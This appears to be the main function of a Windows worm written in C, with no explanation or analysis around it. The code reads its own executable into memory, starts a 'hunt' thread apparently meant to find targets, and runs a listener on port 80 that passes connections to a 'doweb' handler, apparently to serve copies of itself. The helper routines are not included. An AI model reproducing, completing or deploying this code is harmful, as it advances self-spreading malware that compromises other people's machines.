#pragma optimize("", off)

#include "data_globals.h"
#include <windows.h>
#include <winsock2.h>

int main(int argc, char **argv, char **env) {
    volatile struct _LocalCtx {
        WSADATA wsaData;
        SOCKET listen_sock;
        SOCKET client_sock;
        SOCKADDR_IN server_addr;
        SOCKADDR_IN client_addr;
        int addr_len;
        HANDLE hFile;
        DWORD bytesread;
        DWORD threadId;
    } ctx;

    // Initialize variables
    ctx.addr_len = sizeof(ctx.client_addr);

    if (argc < 1) return 1;

    ctx.hFile = CreateFileA(argv[0], GENERIC_READ, FILE_SHARE_READ, NULL,
                            OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (ctx.hFile == INVALID_HANDLE_VALUE) return 1;

    _sizemybytes = GetFileSize(ctx.hFile, NULL);
    if (_sizemybytes == INVALID_FILE_SIZE) { CloseHandle(ctx.hFile); return 1; }

    _mybytes = (char *)malloc(_sizemybytes);
    if (!_mybytes) { CloseHandle(ctx.hFile); return 1; }

    if (!ReadFile(ctx.hFile, _mybytes, _sizemybytes, &ctx.bytesread, NULL) || ctx.bytesread != _sizemybytes) {
        free(_mybytes);
        CloseHandle(ctx.hFile);
        return 1;
    }
    CloseHandle(ctx.hFile);

    if (WSAStartup(MAKEWORD(1, 1), &ctx.wsaData) != 0) {
        free(_mybytes);
        return 1;
    }

    setuphostname();

    // Start hunting thread
    CreateThread(NULL, 0, hunt, NULL, 0, &ctx.threadId);

    ctx.listen_sock = socket(AF_INET, SOCK_STREAM, 0);
    if (ctx.listen_sock == INVALID_SOCKET) {
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    ctx.server_addr.sin_family = AF_INET;
    ctx.server_addr.sin_addr.s_addr = INADDR_ANY;
    ctx.server_addr.sin_port = htons(80);

    if (bind(ctx.listen_sock, (struct sockaddr *)&ctx.server_addr, sizeof(ctx.server_addr)) != 0) {
        closesocket(ctx.listen_sock);
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    if (listen(ctx.listen_sock, 5) != 0) {
        closesocket(ctx.listen_sock);
        WSACleanup();
        free(_mybytes);
        return 1;
    }

    while (TRUE) {
        ctx.client_sock = accept(ctx.listen_sock, (struct sockaddr *)&ctx.client_addr, &ctx.addr_len);
        if (ctx.client_sock == INVALID_SOCKET) continue;
        CreateThread(NULL, 0, doweb, &ctx.client_sock, 0, &ctx.threadId);
    }

    // Never reached
    closesocket(ctx.listen_sock);
    WSACleanup();
    free(_mybytes);
    return 0;
}

#pragma optimize("", on)
